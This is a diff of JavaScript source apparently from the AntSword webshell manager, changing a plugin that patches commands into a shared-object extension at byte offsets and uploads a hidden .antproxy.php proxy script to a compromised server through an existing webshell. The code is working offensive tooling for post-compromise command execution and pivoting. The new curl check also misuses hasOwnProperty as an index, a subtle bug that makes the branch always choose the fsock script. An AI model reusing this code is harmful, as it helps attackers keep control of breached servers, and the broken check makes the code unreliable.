@@ -1,12 +1,15 @@
 'use strict';
 
 const fs = require('fs');
-const {ProxyScript} = require('../payload');
+const {
+  ProxyScript,
+  ProxyScriptFsock
+} = require('../payload');
 const LANG = require('../language'); // 插件语言库
 const LANG_T = antSword['language']['toastr']; // 通用通知提示
 
 class Base {
-/**
+  /**
    * 初始化
    * @param  {Object} cell dhtmlx.cell对象
    * @param  {Object} top  顶层对象
@@ -25,7 +28,8 @@ class Base {
   generateExt(cmd) {
     let self = this;
     let fileBuff = fs.readFileSync(self.ext_path);
-    let start = 0, end = 0;
+    let start = 0,
+      end = 0;
     switch (self.ext_name) {
       case 'ant_x86.so':
         start = 275;
@@ -45,9 +49,9 @@ class Base {
         end = 1691;
         break;
       default:
-      break;
+        break;
     }
-    if(cmd.length > (end - start)) {
+    if (cmd.length > (end - start)) {
       return
     }
     fileBuff[end] = 0;
@@ -57,22 +61,28 @@ class Base {
   }
 
   // 上传代理脚本
-  uploadProxyScript(host="127.0.0.1", port=61111) {
+  uploadProxyScript(host = "127.0.0.1", port = 61111) {
     const PROXY_LANG = LANG['core']['base']['proxyscript'];
     let self = this;
+    let proxycontent = "";
+    if (self.top.infodata.funcs.hasOwnProperty['curl_init'] && self.top.infodata.funcs['curl_init'] == 1) {
+      proxycontent = ProxyScript(`http://${host}:${port}/${self.top.infodata.shell_name}`);
+    } else {
+      proxycontent = ProxyScriptFsock(host, port, `/${self.top.infodata.shell_name}`);
+    }
     self.top.core.request(
       self.top.core.filemanager.create_file({
         path: `${self.top.infodata.phpself}/.antproxy.php`,
-        content: ProxyScript(`http://${host}:${port}/${self.top.infodata.shell_name}`),
+        content: proxycontent,
       })
-    ).then((res)=>{
+    ).then((res) => {
       let ret = res['text'];
       if (ret === '1') {
         toastr.success(PROXY_LANG['success'](`${self.top.infodata.phpself}/.antproxy.php`), LANG_T['success']);
-      }else{
+      } else {
         toastr.error(PROXY_LANG['fail'], LANG_T['error']);
       }
-    }).catch((err)=>{
+    }).catch((err) => {
       toastr.error(`${LANG['error']}: ${JSON.stringify(err)}`, LANG_T['error']);
     });
   }
